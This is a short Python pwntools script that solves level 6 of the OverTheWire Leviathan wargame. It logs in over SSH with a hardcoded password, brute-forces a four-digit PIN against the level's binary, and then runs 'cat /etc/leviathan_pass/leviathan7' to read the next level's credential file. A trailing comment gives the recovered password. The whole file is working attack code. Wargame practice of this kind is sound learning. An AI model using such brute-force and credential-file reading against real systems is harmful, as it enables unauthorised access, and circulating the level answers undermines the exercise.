from pwn import *
shell = ssh('leviathan6', 'leviathan.labs.overthewire.org',
        password='UgaoFee4li')
sh = shell.run('bash')
log.info(sh.recv(timeout=5).decode())
#####################################

# if it needs 4 digits, give it four...
# brute-forcing, not elegant but solves it.

for i in range(1000, 10000):
    sh.sendline('./leviathan6 {}'.format(i))
    test = sh.recv(timeout=5).decode()
    if test.strip()[:5] == 'Wrong':
        pass
    else:
        sh.sendline('cat /etc/leviathan_pass/leviathan7')
        log.info(sh.recv(timeout=5).decode())



#pass ahy7MaeBo9
